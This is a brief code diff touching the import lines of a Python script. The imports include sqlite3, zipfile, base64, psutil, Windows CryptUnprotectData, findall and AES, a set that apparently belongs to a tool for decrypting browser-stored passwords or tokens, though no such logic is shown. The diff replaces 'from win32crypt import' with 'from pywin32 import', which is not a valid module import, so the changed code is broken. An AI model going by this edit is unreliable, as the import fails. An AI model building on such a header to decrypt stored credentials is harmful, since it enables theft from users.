@@ -3,11 +3,11 @@ import os
 import shutil 
 import sqlite3 
 import zipfile 
-import json 
+import json
 import base64 
 import psutil 
 
-from win32crypt import CryptUnprotectData
+from pywin32 import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
 
